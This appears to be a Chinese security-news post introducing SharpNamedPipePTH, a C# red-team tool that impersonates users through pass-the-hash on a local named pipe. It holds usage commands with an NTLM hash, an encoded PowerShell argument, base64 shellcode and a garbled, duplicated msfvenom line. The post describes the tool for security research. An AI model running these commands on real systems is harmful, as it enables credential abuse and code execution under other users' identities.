![](https://image.3001.net/images/20220928/1664370370_633446c2c240e7270fa96.png!small)

## 关于SharpNamedPipePTH

SharpNamedPipePTH是一款基于C#开发的安全工具，该工具可以利用哈希传递技术（Pass-the-Hash）在本地命名管道上进行身份认证，并实现用户令牌模拟。需要注意的是，该工具需要本地管理员权限或SEImpersonate权限。

## 功能介绍

> 1、具备功能完整的Shell；
>
> 2、支持与目标设备用户账号建立C2链接；
>
> 3、支持模拟低权限账号；
>
> 4、该工具支持以C2模块使用；

不幸的是，模拟用户不允许网络身份验证，因为新进程使用的将会是受限制的模拟令牌。因此，我们只能将此技术用于其他用户的本地操作。

## 工具下载

广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/S3cur3Th1sSh1t/SharpNamedPipePTH.git

接下来，我们就可以将项目导入到Visual Studio中，构建代码即可。

## 工具使用

我们有两种方法来使用SharpNamedPipePTH，我们可以直接执行下列代码（可以携带相关参数）：

    
    
    SharpNamedPipePTH.exe username:testing hash:7C53CFA5EA7D0F9B3B968AA0FB51A3F5 binary:C:\windows\system32\cmd.exe

![](https://image.3001.net/images/20220928/1664370400_633446e04eb61e7063817.jpg!small)

    
    
    SharpNamedPipePTH.exe username:testing domain:localhost hash:7C53CFA5EA7D0F9B3B968AA0FB51A3F5 binary:"C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" arguments:"-nop -w 1 -sta -enc bgBvAHQAZQBwAGEAZAAuAGUAeABlAAoA"

或者，该工具也支持以其他用户身份/权限来执行Shellcode：

    
    
    SharpNamedPipePTH.exe username:testing domain:localhost hash:7C53CFA5EA7D0F9B3B968AA0FB51A3F5 shellcode:/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu+AdKgpBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY21kLmV4ZQA=
    
    
    msfvenom -p windows/x64/exec CMD=cmd.exe EXITFUNC=threadmsfvenom -p windows/x64/exec CMD=cmd.exe EXITFUNC=thread | base64 -w0

![](https://image.3001.net/images/20220928/1664370420_633446f4cd880b70e8bf3.jpg!small)

当前版本SharpNamedPipePTH的Shellcode执行效果还不是很好，因为它只能以模拟用户身份运行记事本程序，并通过D/Invoke
CreateRemoteThread
Syscall系统调用将Shellcode注入到新进程中。因此，开发人员正在寻找其他方法在后台生成进程或执行Shellcode，而不需要目标用户的进程进行内存分配。

## 许可证协议

本项目的开发与发布遵循[ _BSD_
_-3-Clause_](https://github.com/S3cur3Th1sSh1t/SharpNamedPipePTH/blob/main/LICENSE)开源许可证协议。

## 项目地址

 **SharpNamedPipePTH** ：【[
_GitHub传送门_](https://github.com/S3cur3Th1sSh1t/SharpNamedPipePTH)】

## 参考资料

> [ _https://s3cur3th1ssh1t.github.io/Named-Pipe-> PTH/_](https://s3cur3th1ssh1t.github.io/Named-Pipe-PTH/)
>
> [ _https://github.com/checkymander/Sharp-> SMBExec/_](https://github.com/checkymander/Sharp-SMBExec/)

